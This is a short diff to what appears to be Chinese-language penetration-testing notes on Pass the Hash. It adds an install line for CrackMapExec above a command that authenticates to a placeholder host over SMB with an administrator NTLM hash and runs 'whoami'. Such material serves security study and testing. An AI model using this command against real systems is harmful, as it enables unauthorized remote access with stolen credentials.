@@ -690,6 +690,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 - [byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - A swiss army knife for pentesting networks
     ```bash
+    pip2 install crackmapexec
     cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
     ```
 
